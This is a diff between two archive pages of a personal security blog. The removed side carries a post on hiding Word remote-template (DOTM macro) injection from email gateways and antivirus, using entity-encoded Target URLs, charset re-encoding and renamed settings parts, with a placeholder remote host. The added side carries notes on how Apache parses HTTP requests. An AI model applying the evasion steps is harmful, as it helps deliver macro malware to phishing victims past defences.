@@ -10,7 +10,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="turn1tup&#39;s blog">
-<meta property="og:url" content="https://turn1tup.github.io/page/3/index.html">
+<meta property="og:url" content="https://turn1tup.github.io/page/17/index.html">
 <meta property="og:site_name" content="turn1tup&#39;s blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="turn1tup">
@@ -152,61 +152,74 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-word远程模板文档混淆" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-简析Apache如何解析HTTP请求" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/">word远程模板文档混淆</a>
+      <a class="article-title" href="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/">简析Apache如何解析HTTP请求</a>
     </h1>
   
 
         
-        <a href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/" class="archive-article-date">
-  	<time datetime="2021-10-21T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-20</time>
+        <a href="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/" class="archive-article-date">
+  	<time datetime="2019-10-04T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-03</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="远程模板及文档混淆"><a href="#远程模板及文档混淆" class="headerlink" title="远程模板及文档混淆"></a>远程模板及文档混淆</h1><p>通过远程模板的方式，我们可以使得邮件中发送的docx文档不直接带宏，对规避免杀有帮助。通常的手法是修改 <code>word/_rels/settings.xml.rels</code>中的relationship标签的Target值为远程的DOTM文档</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationships</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>&gt;</span><span class="tag">&lt;<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">"rId1"</span> <span class="attr">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> <span class="attr">Target</span>=<span class="string">"https://xxx.xxx.xxx/xx.dotm"</span> <span class="attr">TargetMode</span>=<span class="string">"External"</span>/&gt;</span><span class="tag">&lt;/<span class="name">Relationships</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>该手法总所周知，防护实体可能会检测Target这一字段，并对文档进行拦截，下面笔者说一下对文档的混淆思路，避免因远程模板特征直接被邮件网关拦截。</p>
-<h2 id="XML特性"><a href="#XML特性" class="headerlink" title="XML特性"></a>XML特性</h2><p>我们知道，在web漏洞利用时，payload为xml/soap时，我们可以利用其XML特性来bypass WAF，这里也同样适用。</p>
-<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>编码脚本可以参考 <a href="https://github.com/turn1tup/scriptlet/blob/main/encoder.py" target="_blank" rel="noopener">https://github.com/turn1tup/scriptlet/blob/main/encoder.py</a></p>
-<p>针对<code>Target</code>值我们可以使用的编码方式：HTML-10进制、HTML-16进制、HTML畸形编码，对应<code>encoder.py</code>输出的 html_entity_data_decimal、html_entity_data_hex、html_entity_data_spe</p>
-<p><img src="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/encoder.png" alt></p>
-<p>使用HTML畸形编码我们可以获得如下文档：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;Relationships xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;package&#x2F;2006&#x2F;relationships&quot;&gt;&lt;Relationship Id&#x3D;&quot;rId1&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;attachedTemplate&quot; Target&#x3D;&quot;&amp;#x0000068;&amp;#0000116;&amp;#x00074;&amp;#0000112;&amp;#x0000073;&amp;#00058;&amp;#x000002f;&amp;#0000047;&amp;#x00078;&amp;#000120;&amp;#x0000078;&amp;#000046;&amp;#x0000078;&amp;#00000120;&amp;#x000078;&amp;#000046;&amp;#x000078;&amp;#0000120;&amp;#x00078;&amp;#0000047;&amp;#x000078;&amp;#0000120;&amp;#x0002e;&amp;#0000100;&amp;#x0006f;&amp;#000116;&amp;#x000006d;&quot; TargetMode&#x3D;&quot;External&quot;&#x2F;&gt;&lt;&#x2F;Relationships&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>通过修改xml头部标签的<code>encoding</code>字符集声明，并转换xml文档为对应的字符集，我们可以混淆整个xml文档</p>
-<p>脚本参考 <a href="https://github.com/turn1tup/scriptlet/blob/main/charset_test.py" target="_blank" rel="noopener">https://github.com/turn1tup/scriptlet/blob/main/charset_test.py</a></p>
-<p>我们可以使用的字符集有 utf-16le 、utf-16be、utf-32le、utf-32be（另外微软的软件通常比较支持UTF-7，但这个字符集不好测试），在脚本中填入我们的 <code>settings.xml.rels</code>的原始内容，并修改<code>encoding</code>字段，运行脚本后使用获得的<code>setings.xml.rels</code>文件覆盖原始docx文档的 <code>word/rels/settings.xml/rels</code>文件即可。另外注意，我们使用记事本打开UTF16文档看到的内容与UTF8文档没有差异，但实际前者为后者2倍大小。</p>
-<p><img src="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/charset_test.png" alt></p>
-<h2 id="修改文档位置"><a href="#修改文档位置" class="headerlink" title="修改文档位置"></a>修改文档位置</h2><p><code>word/_rels/settings.xml.rels</code>的位置是可变动的</p>
-<p>一般使用远程模板加载DOTM手法时，修改的文件为word/rels/settings.xml.res</p>
-<p>我们可以修改为其他文件，过程如下：</p>
-<p>①修改<code>[Content_Types].xml</code>中的<code>/word/settings.xml</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Override PartName&#x3D;&quot;&#x2F;word&#x2F;settings.xml&quot; ContentType&#x3D;&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.settings+xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里修改为<code>/word/foo.xml</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Override PartName&#x3D;&quot;&#x2F;word&#x2F;foo.xml&quot; ContentType&#x3D;&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.settings+xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>②同步修改的文件名称</p>
-<p><code>word/_rels/setting.xml</code> -&gt;<code>word/_rels/foo.xml</code> </p>
-<p><code>word/_rels/settings.xml.rels</code> -&gt;<code>word/_rels/foo.xml.rels</code></p>
-<p>③<code>word/rels/document.xml.rels</code>中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id&#x3D;&quot;rId6&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;settings&quot; Target&#x3D;&quot;setting.xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>修改为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id&#x3D;&quot;rId6&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;settings&quot; Target&#x3D;&quot;foo.xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
+        <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>之前看了看Apache是如何解析HTTP请求的，整理了一下笔记，说说其中的一些要点。</p>
+<p>首先，在最新版本的Apache服务器http2.4.41中，似乎移除了对HTTP的许多“兼容特性”，这些特性是不符合RFC标准的，而笔者当时阅读的代码为2.4.3，本文记录了笔者在阅读代码时认为十分重要的一些解析细节。</p>
+<h2 id="read-a-line"><a href="#read-a-line" class="headerlink" title="read a line"></a>read a line</h2><p>Apache读到LF字符时，就判断一行已经读完了。</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575636988533.png" alt="1575636988533"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637029446.png" alt="1575637029446"></p>
+<h2 id="before-request-line"><a href="#before-request-line" class="headerlink" title="before request line"></a>before request line</h2><p>读取请求行时，会跳过blank line，默认为DEFAULT_LIMIT_BLANK_LINES 次 （limit_req_fields没有被初始化），奇怪的是在2.4.3源码中没有搜索到定义值，在2.4.41中倒是搜索到了。</p>
+<p>Apache之所以会这样做，代码中解释说，浏览器在发POST请求时，会在末尾添加CRLF，如果形成一个pileline请求，request line前面就会有空行。</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637431252.png" alt="1575637431252"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637515203.png" alt="1575637515203"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637273820.png" alt="1575637273820"></p>
+<h2 id="request-line"><a href="#request-line" class="headerlink" title="request line"></a>request line</h2><p>请求行默认长度最大为8190字节，请求行由三部分组成 method、uri、version</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575636873879.png" alt="1575636873879"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637842396.png" alt="1575637842396"></p>
+<p>在获取method 、uri的时候，需要判断是否空白字符，2.4.3使用isspace来判断是否空白字符。</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575638543636.png" alt="1575638543636"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575638436652.png" alt="1575638436652"></p>
+<p>内置method有26个，未被识别时返回UNKNOWN_METHOD（为啥phpstudy搭建的2.4.23 瞎写method都可以…）</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575639434615.png" alt="1575639434615"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575639557902.png" alt="1575639557902"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575639039658.png" alt="1575639039658"></p>
+<p>version没被解析成功的情况下，被设置为HTTP1.0</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575638751179.png" alt="1575638751179"></p>
+<p>URI是如何解析的，没有看到具体代码，相应的函数是个钩子函数。</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575641409296.png" alt="1575641409296"></p>
+<p>在URL路径中，即？前面的字符串中，如果存在畸形URL编码，如%fg，则直接返回400；如果存在0字符，则返回404</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575641491019.png" alt="1575641491019"></p>
+<h2 id="header-filed"><a href="#header-filed" class="headerlink" title="header filed"></a>header filed</h2><p>每个头部默认长度最大为8190字节，头部个数最大默认为100</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575642413511.png" alt="1575642413511"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575642630350.png" alt="1575642630350"></p>
+<p>如果一个头部以SP或HT字符开头，表示该头部是上一个头部的extended，或者说是一个continue header line，该行将被合并到上一行，符合RFC。</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/0570bbebcd774693909db21e89a21da2.png" alt="img"></p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/d1733fc5e392425f9081dc7d3e1b31ff.png" alt="img"></p>
+<p>请求域行中必须要有冒号 :</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/5f8b0bd018e44015b9ca8e822a692680.png" alt="img"></p>
+<p>头部中的多个LWS字符会被跳过。</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/264ae11b938641b1b83bb9402035693d.png" alt="img"></p>
+<p>相同头部字段名的头部行将被合并，缓冲区大小不变</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/ae2506ae48ab4c329bda241f1c261d88.png" alt="img"></p>
+<h2 id="TE"><a href="#TE" class="headerlink" title="TE"></a>TE</h2><p>Transfer-Encoding存在时忽略Content-Length</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575642736359.png" alt="1575642736359"></p>
+<p>TE头部的值必须为chunked</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575647450202.png" alt="1575647450202"></p>
+<h2 id="must-hostname"><a href="#must-hostname" class="headerlink" title="must hostname"></a>must hostname</h2><p>http 1.1必须要有host头部字段，否则返回400</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/908d16b3e233405abbdba1fc3360eeac.png" alt="img"></p>
+<p>当Content-Type不为空且前面33个字符值为application/x-www-form-urlencoded时，会将Body认为为表单，并以”&amp;”符号分割表单，“=”区分key value，并且会对二者都进行URL解码，详细代码冗长，就不贴出来了。</p>
+<p><img src="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575646708932.png" alt="1575646708932"></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>代码最后看下来，在HTTP解析这块，我们需要关注的要点不是很繁多，而C代码只以业务功能的视角来浏览的话，不难。</p>
+<p>不过没有看到Apache解析multipart/form-data的代码，说明这种内容格式是web语言处理的。</p>
 
       
 
@@ -219,7 +232,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/10/03/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/">展开全文 >></a>
         </p>
       
 
@@ -251,7 +264,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/16/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/18/">Next &amp;raquo;</a>
     </nav>
   
 
